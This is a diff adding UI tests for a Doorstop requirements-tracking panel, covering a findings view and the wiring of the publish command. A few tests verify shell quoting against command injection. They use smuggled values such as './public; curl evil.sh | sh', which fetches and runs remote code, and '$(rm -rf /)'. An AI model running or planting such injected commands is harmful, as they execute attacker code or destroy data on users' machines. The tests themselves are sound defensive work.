@@ -26,6 +26,7 @@ import {
   type DoorstopWorkspaceJob,
 } from "./doorstop-panel-controller.js";
 import type { DoorstopWorkspaceResult } from "./doorstop-panel.js";
+import { loadDoorstopWorkspace } from "./doorstop-panel.js";
 import { DEFAULT_OPENDOOR_SETTINGS } from "./doorstop-settings.js";
 import {
   draftChildRequirementPrompt,
@@ -37,15 +38,30 @@ import {
   bodyElementTag,
   defineDoorstopPanelElements,
   documentStateDots,
+  doorstopPublishCommand,
+  doorstopPublishTarget,
   EMPTY_WORKSPACE_MESSAGE,
+  FINDINGS_EMPTY_HINT,
+  FINDINGS_EMPTY_MESSAGE,
+  FINDINGS_PLUGIN_LOCAL_NOTE,
   filteredItems,
+  findingsCountText,
+  findingsViewCounts,
+  findingsViewRows,
   shortFingerprint,
   STATE_CHIP_LABELS,
   stateChipKind,
   suspectParentItems,
   type DoorstopPanelBodyElement,
 } from "./doorstop-panel-elements.js";
-import { createFakeFiles, type FakeWorkspaceFiles } from "./test-support.js";
+import {
+  createFakeFiles,
+  dirEntry,
+  fileEntry,
+  text,
+  tree,
+  type FakeWorkspaceFiles,
+} from "./test-support.js";
 
 const doorstopWorkspace: Workspace = {
   id: "workspace-1",
@@ -945,6 +961,411 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-refresh")?.click();
     await settle();
     expect(invalidate).toHaveBeenCalledTimes(1);
+  });
+});
+
+describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
+  it("toggles between the Items and Findings views; items-only affordances hide in findings", async () => {
+    const { body } = await mountBody(() => Promise.resolve(makeTreeResult()));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+
+    // Items is the default view, with the toolbar toggle present.
+    expect(root.querySelector(".doorstop-view-toggle")).not.toBeNull();
+    expect(root.querySelector(".doorstop-item-row")).not.toBeNull();
+    expect(root.querySelector(".doorstop-doc-chip")).not.toBeNull();
+    expect(root.querySelector(".doorstop-state-filter")).not.toBeNull();
+    expect(root.querySelector(".doorstop-search")).not.toBeNull();
+    expect(root.querySelector(".doorstop-findings-view")).toBeNull();
+
+    const findingsTab = root.querySelector<HTMLElement>(".doorstop-view-findings");
+    const itemsTab = root.querySelector<HTMLElement>(".doorstop-view-items");
+    expect(findingsTab?.getAttribute("aria-selected")).toBe("false");
+    expect(itemsTab?.getAttribute("aria-selected")).toBe("true");
+    findingsTab?.click();
+    await flush(body);
+
+    // Findings view replaces the item layout; docs/filters/search hide;
+    // the terminal actions stay reachable in both views.
+    expect(root.querySelector(".doorstop-findings-view")).not.toBeNull();
+    expect(root.querySelector(".doorstop-item-row")).toBeNull();
+    expect(root.querySelector(".doorstop-doc-chip")).toBeNull();
+    expect(root.querySelector(".doorstop-state-filter")).toBeNull();
+    expect(root.querySelector(".doorstop-search")).toBeNull();
+    expect(findingsTab?.getAttribute("aria-selected")).toBe("true");
+    expect(itemsTab?.getAttribute("aria-selected")).toBe("false");
+    expect(root.querySelector(".doorstop-refresh")).not.toBeNull();
+    expect(root.querySelector(".doorstop-validate")).not.toBeNull();
+    expect(root.querySelector(".doorstop-publish")).not.toBeNull();
+
+    // Back to items.
+    itemsTab?.click();
+    await flush(body);
+    expect(root.querySelector(".doorstop-item-row")).not.toBeNull();
+    expect(root.querySelector(".doorstop-findings-view")).toBeNull();
+    expect(itemsTab?.getAttribute("aria-selected")).toBe("true");
+  });
+
+  it("keeps the document/state/search filters driving the re-created controls across an Items → Findings → Items round trip", async () => {
+    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+
+    // Active filters — the findings toggle is element-local @state, so these
+    // controller-mirrored fields must survive a trip through the findings
+    // view untouched (the round-trip filter-preservation invariant).
+    controller.selectDocument("REQ");
+    controller.setStateFilter("suspect-link");
+    controller.setSearch("REQ0002");
+    bindBody(body, controller, context);
+    await flush(body);
+    let select = root.querySelector<HTMLSelectElement>(".doorstop-state-filter");
+    let search = root.querySelector<HTMLInputElement>(".doorstop-search");
+    expect(select?.value).toBe("suspect-link");
+    expect(search?.value).toBe("REQ0002");
+    expect(root.querySelector('.doorstop-doc-chip[data-prefix="REQ"]')?.classList.contains("is-selected")).toBe(true);
+
+    // The findings view removes the items-only controls entirely…
+    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
+    await flush(body);
+    expect(root.querySelector(".doorstop-state-filter")).toBeNull();
+    expect(root.querySelector(".doorstop-search")).toBeNull();
+    expect(root.querySelector(".doorstop-doc-chip")).toBeNull();
+
+    // …and back in Items the re-created controls still reflect every filter.
+    // happy-dom does not recompute a freshly re-created <select>'s value when
+    // Lit sets `.selected` on options before they are inserted (it does for
+    // the already-connected options, which is why the first assertion above
+    // passes) — so assert the preserved element state that drives the
+    // controls, the controls that happy-dom reflects faithfully, and that
+    // the re-created <select> is wired to the preserved value.
+    root.querySelector<HTMLElement>(".doorstop-view-items")?.click();
+    await flush(body);
+    select = root.querySelector<HTMLSelectElement>(".doorstop-state-filter");
+    search = root.querySelector<HTMLInputElement>(".doorstop-search");
+    expect(body.stateFilter).toBe("suspect-link");
+    expect(body.search).toBe("REQ0002");
+    expect(body.selectedDocumentPrefix).toBe("REQ");
+    expect(search?.value).toBe("REQ0002");
+    expect(root.querySelector('.doorstop-doc-chip[data-prefix="REQ"]')?.classList.contains("is-selected")).toBe(true);
+    // The re-created <select> carries the preserved stateFilter through the
+    // real change path, and the preserved filters still drive the item list.
+    if (select === null) throw new Error("select");
+    select.value = body.stateFilter ?? "";
+    select.dispatchEvent(new Event("change"));
+    expect(controller.stateFilter).toBe("suspect-link");
+    expect(root.querySelector('.doorstop-item-row[data-uid="REQ0002"]')).not.toBeNull();
+    expect(root.querySelector('.doorstop-item-row[data-uid="REQ0001"]')).toBeNull();
+  });
+
+  it("lists findings sorted error → warning → info with severity chips, matching the pure helpers", async () => {
+    const result = makeTreeResult();
+    const findings = result.index.findings;
+    findings.splice(
+      0,
+      findings.length,
+      { severity: "warning", uid: "TST001", message: "suspect link: REQ0001" },
+      { severity: "error", uid: "REQ0001", message: "external reference not found: docs/x.pdf" },
+      { severity: "info", message: "needs initial review" },
+      { severity: "error", path: "reqs/REQ0003.yml", message: "Could not read file: EACCES" },
+    );
+    result.index.diagnostics.push({ severity: "warning", path: "tests/TST001.yml", message: "binary file skipped" });
+    const { body } = await mountBody(() => Promise.resolve(result));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
+    await flush(body);
+
+    const rows = [...(root.querySelectorAll(".doorstop-finding-row") ?? [])];
+    const messages = rows.map((row) => row.querySelector(".doorstop-finding-message")?.textContent);
+    const expected = findingsViewRows(result.index).map((row) => row.message);
+    // errors first (input order), then warnings, then info — same as the
+    // exported pure helper (a stable severity sort).
+    expect(messages).toEqual([
+      "external reference not found: docs/x.pdf",
+      "Could not read file: EACCES",
+      "suspect link: REQ0001",
+      "binary file skipped",
+      "needs initial review",
+    ]);
+    expect(messages).toEqual(expected);
+
+    // Every row carries its severity chip + suffix class, in DOM order.
+    rows.forEach((row, index) => {
+      const severity = findingsViewRows(result.index)[index]!.severity;
+      expect(row.classList.contains(`doorstop-${severity}`)).toBe(true);
+      expect(row.querySelector(".doorstop-severity")?.textContent).toBe(severity);
+    });
+
+    // The error rows: a navigable UID button / a path; the info row has neither.
+    const errorRows = rows.filter((row) => row.classList.contains("doorstop-error"));
+    const uidButton = errorRows[0]!.querySelector<HTMLElement>(".doorstop-finding-uid");
+    expect(uidButton?.tagName).toBe("BUTTON");
+    expect(uidButton?.textContent).toBe("REQ0001");
+    expect(errorRows[1]!.querySelector(".doorstop-finding-path")?.textContent).toBe("reqs/REQ0003.yml");
+    expect(rows[rows.length - 1]!.querySelector(".doorstop-finding-uid")).toBeNull();
+  });
+
+  it("renders a finding's UID as an inert code chip when the item is not in the index (no navigation button)", async () => {
+    const result = makeTreeResult();
+    result.index.findings.splice(
+      0,
+      result.index.findings.length,
+      { severity: "warning", uid: "REQ9999", message: "references an item missing from this workspace" },
+    );
+    const { body } = await mountBody(() => Promise.resolve(result));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
+    await flush(body);
+
+    // REQ9999 is not in index.byUid → the row renders the inert half of the
+    // "clickable only when the uid exists" rule: a plain <code>, not the
+    // clickable <button data-uid> navigation surface.
+    const uidNode = root.querySelector<HTMLElement>(".doorstop-finding-uid");
+    expect(uidNode).not.toBeNull();
+    expect(uidNode?.tagName).toBe("CODE");
+    expect(uidNode?.textContent).toBe("REQ9999");
+    expect(root.querySelector('.doorstop-finding-uid[data-uid="REQ9999"]')).toBeNull();
+    expect(root.querySelector<HTMLElement>(".doorstop-finding-uid")?.hasAttribute("title")).toBe(false);
+    // The row still lists its message with the severity chip.
+    expect(root.querySelector(".doorstop-finding-row")?.classList.contains("doorstop-warning")).toBe(true);
+    expect(root.querySelector(".doorstop-finding-message")?.textContent).toBe(
+      "references an item missing from this workspace",
+    );
+  });
+
+  it("renders grouped severity counts in the findings header", async () => {
+    const { body } = await mountBody(() => Promise.resolve(makeTreeResult()));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
+    await flush(body);
+
+    const counts = root.querySelector(".doorstop-findings-counts");
+    expect(counts?.textContent).toBe("1 error · 3 warnings · 3 info");
+    const index = body.result?.index;
+    if (index === undefined) throw new Error("no result");
+    expect(findingsCountText(findingsViewCounts(findingsViewRows(index)))).toBe("1 error · 3 warnings · 3 info");
+    // The plugin-local label stays visible above the list.
+    expect(root.querySelector(".doorstop-findings-note")?.textContent).toContain("plugin-local");
+  });
+
+  it("navigates from a finding UID to the item: clears filters and switches to the Items view", async () => {
+    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+
+    // Hide TST001 under the current filters (document = REQ, state =
+    // suspect-link, search = verify) so the navigation has to clear them.
+    controller.selectDocument("REQ");
+    controller.setStateFilter("suspect-link");
+    controller.setSearch("verify");
+    bindBody(body, controller, context);
+    await flush(body);
+    expect(root.querySelector('.doorstop-item-row[data-uid="TST001"]')).toBeNull();
+
+    // Switch to findings and click TST001's UID row.
+    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
+    await flush(body);
+    const uidButton = root.querySelector<HTMLElement>('.doorstop-finding-uid[data-uid="TST001"]');
+    expect(uidButton).not.toBeNull();
+    uidButton?.click();
+
+    // Navigation cleared the filters, selected TST001, and switched to Items.
+    expect(controller.selectedDocumentPrefix).toBe("");
+    expect(controller.stateFilter).toBeUndefined();
+    expect(controller.search).toBe("");
+    expect(controller.selectedUid).toBe("TST001");
+    bindBody(body, controller, context);
+    await flush(body);
+    expect(root.querySelector<HTMLElement>(".doorstop-view-items")?.getAttribute("aria-selected")).toBe("true");
+    expect(root.querySelector('.doorstop-item-row[data-uid="TST001"]')).not.toBeNull();
+    expect(root.querySelector(".doorstop-detail-pane")?.textContent).toContain("TST001");
+  });
+
+  it("shows the clean-tree empty state with the plugin-local hint when there are no findings", async () => {
+    const reqConfig = makeDocument();
+    const req0001 = makeItem("REQ0001", "REQ", { path: "reqs/REQ0001.yml", text: "The system shall do X." });
+    // Reviewed against the current fingerprint → no state findings at all.
+    req0001.reviewed = computeItemStamp(req0001, reqConfig, true);
+    const result = makeResult([req0001], [reqConfig], []);
+    const { body } = await mountBody(() => Promise.resolve(result));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
+    await flush(body);
+
+    const empty = root.querySelector(".doorstop-findings-view .doorstop-empty");
+    expect(empty?.textContent).toContain(FINDINGS_EMPTY_MESSAGE);
+    expect(empty?.textContent).toContain(FINDINGS_EMPTY_HINT);
+    expect(root.querySelector(".doorstop-findings-list")).toBeNull();
+    expect(root.querySelector(".doorstop-findings-counts")?.textContent).toBe("0 errors · 0 warnings · 0 info");
+    expect(root.querySelector(".doorstop-findings-note")?.textContent).toContain(FINDINGS_PLUGIN_LOCAL_NOTE);
+  });
+
+  it("keeps the Run validation terminal action reachable from the findings view", async () => {
+    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
+    await flush(body);
+    root.querySelector<HTMLElement>(".doorstop-validate")?.click();
+    await settle();
+    expect(context.terminal.runCommand).toHaveBeenCalledWith({
+      title: "Doorstop: validate",
+      command: "doorstop",
+      metadata: { "opendoor.op": "validate" },
+      open: true,
+    });
+  });
+});
+
+describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
+  it("publishes to the workspace publishTarget from a settings fixture, with the exact command", async () => {
+    const confirmSpy = stubConfirm(true);
+    const { files } = createFakeFiles({
+      trees: {
+        "": tree([dirEntry("reqs", "reqs")]),
+        "reqs": tree([fileEntry(".doorstop.yml", "reqs/.doorstop.yml"), fileEntry("REQ0001.yml", "reqs/REQ0001.yml")]),
+      },
+      reads: {
+        ".pi-web/opendoor.json": text(JSON.stringify({ version: 1, publishTarget: "./site" })),
+        "reqs/.doorstop.yml": text("settings:\n  prefix: REQ\n  digits: 4"),
+        "reqs/REQ0001.yml": text("text: The system shall do X."),
+      },
+    });
+    const { body, controller, context } = await mountBody(() => loadDoorstopWorkspace(files));
+    // loadDoorstopWorkspace's async chain is a few frames longer than a bare
+    // Promise.resolve result — give it room to land before asserting.
+    for (let turn = 0; turn < 50; turn += 1) await Promise.resolve();
+    bindBody(body, controller, context);
+    await flush(body);
+    const result = body.result;
+    if (result === undefined) throw new Error("no result");
+    expect(result.settings.publishTarget).toBe("./site");
+    expect(doorstopPublishTarget(result)).toBe("./site");
+    expect(doorstopPublishCommand(result)).toBe("doorstop publish all ./site");
+
+    // The button title reflects the target; clicking confirms + runs it.
+    const publish = body.shadowRoot?.querySelector<HTMLElement>(".doorstop-publish");
+    expect(publish?.getAttribute("title")).toBe("Publish the tree to ./site");
+    publish?.click();
+    await settle();
+    expect(confirmSpy).toHaveBeenCalledWith("Publish the Doorstop tree as HTML to ./site in the workspace terminal?");
+    expect(context.terminal.runCommand).toHaveBeenCalledWith({
+      title: "Doorstop: publish",
+      command: "doorstop publish all ./site",
+      metadata: { "opendoor.op": "publish" },
+      open: false,
+    });
+  });
+
+  it("publishes to the default target when the result has no settings (and when there is no result)", async () => {
+    const confirmSpy = stubConfirm(true);
+    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+
+    // Strip settings from the result — a result built by an older caller, or
+    // the hardened path before settings land.
+    const bare = body.result;
+    if (bare === undefined) throw new Error("no result");
+    body.result = { index: bare.index } as DoorstopWorkspaceResult;
+    await flush(body);
+    expect(doorstopPublishTarget(body.result)).toBe(DEFAULT_OPENDOOR_SETTINGS.publishTarget);
+    expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all ./public");
+
+    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
+    await settle();
+    expect(confirmSpy).toHaveBeenCalledWith("Publish the Doorstop tree as HTML to ./public in the workspace terminal?");
+    expect(context.terminal.runCommand).toHaveBeenCalledWith({
+      title: "Doorstop: publish",
+      command: "doorstop publish all ./public",
+      metadata: { "opendoor.op": "publish" },
+      open: false,
+    });
+
+    // With NO result at all the fallback still applies (default target).
+    vi.mocked(context.terminal.runCommand).mockClear();
+    body.result = undefined;
+    await flush(body);
+    expect(doorstopPublishTarget(undefined)).toBe(DEFAULT_OPENDOOR_SETTINGS.publishTarget);
+    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
+    await settle();
+    expect(context.terminal.runCommand).toHaveBeenCalledWith({
+      title: "Doorstop: publish",
+      command: "doorstop publish all ./public",
+      metadata: { "opendoor.op": "publish" },
+      open: false,
+    });
+  });
+
+  it("shell-quotes a settings publishTarget containing shell metacharacters so a committed .pi-web/opendoor.json cannot inject a command", async () => {
+    const confirmSpy = stubConfirm(true);
+    const hostile = "./public; curl evil.sh | sh";
+    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
+    const root = body.shadowRoot;
+    if (root === null) throw new Error("shadow root");
+
+    // The settings validator ACCEPTS this string — a safe relative path (no
+    // `..`, not absolute, no backslash) — so the command boundary in
+    // doorstopPublishCommand is the last line of defense and must quote it.
+    const bare = body.result;
+    if (bare === undefined) throw new Error("no result");
+    body.result = { index: bare.index, settings: { publishTarget: hostile, excludedDirectories: [] } };
+    await flush(body);
+    expect(doorstopPublishTarget(body.result)).toBe(hostile);
+    expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all './public; curl evil.sh | sh'");
+
+    // The confirm dialog shows the target literally (display only — the user
+    // sees what they configured); the executed command carries it as ONE
+    // single-quoted argument, so `;`, `|`, and the rest cannot execute.
+    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
+    await settle();
+    expect(confirmSpy).toHaveBeenCalledWith(
+      "Publish the Doorstop tree as HTML to ./public; curl evil.sh | sh in the workspace terminal?",
+    );
+    expect(context.terminal.runCommand).toHaveBeenCalledWith({
+      title: "Doorstop: publish",
+      command: "doorstop publish all './public; curl evil.sh | sh'",
+      metadata: { "opendoor.op": "publish" },
+      open: false,
+    });
+  });
+
+  it("quotes only targets outside the inert token alphabet; an embedded quote uses the shell '\\'' escape", () => {
+    const result = makeTreeResult();
+    const withTarget = (publishTarget: string): DoorstopWorkspaceResult => ({
+      index: result.index,
+      settings: { publishTarget, excludedDirectories: [] },
+    });
+    // Inert `[\w./-]` targets keep the canonical bare command spelling.
+    expect(doorstopPublishCommand(withTarget("./public"))).toBe("doorstop publish all ./public");
+    expect(doorstopPublishCommand(withTarget("./docs/final-2"))).toBe("doorstop publish all ./docs/final-2");
+    // Anything else is emitted as a single shell-quoted argument.
+    expect(doorstopPublishCommand(withTarget("./docs (final)"))).toBe("doorstop publish all './docs (final)'");
+    expect(doorstopPublishCommand(withTarget("./it's"))).toBe("doorstop publish all './it'\\''s'");
+    expect(doorstopPublishCommand(withTarget("$(rm -rf /)"))).toBe("doorstop publish all '$(rm -rf /)'");
+    // An explicit target is honored (the publish click threads the same
+    // value it put in the confirm message, so the two stay consistent).
+    expect(doorstopPublishCommand(result, "./site")).toBe("doorstop publish all ./site");
+  });
+
+  it("pins the freeze contract the fixtures depend on: the settings default is truly frozen, the model index only by convention", () => {
+    // DEFAULT_OPENDOOR_SETTINGS is handed out BY REFERENCE on every defaults
+    // path, so it is genuinely frozen — one consumer mutating what it
+    // received must not corrupt the shared default for everyone. The model
+    // index, by contrast, is frozen by CONVENTION only (the contract's
+    // wording): the findings fixtures splice into `index.findings` and the
+    // no-settings test strips `settings` off a result. Pin the runtime truth
+    // here so a drift to runtime-freezing fails at this fixture with a clear
+    // message instead of a confusing TypeError mid-assertion.
+    expect(Object.isFrozen(DEFAULT_OPENDOOR_SETTINGS)).toBe(true);
+    const index = makeTreeResult().index;
+    expect(Object.isFrozen(index)).toBe(false);
+    expect(Object.isFrozen(index.findings)).toBe(false);
+    expect(Object.isFrozen(index.diagnostics)).toBe(false);
   });
 });
 
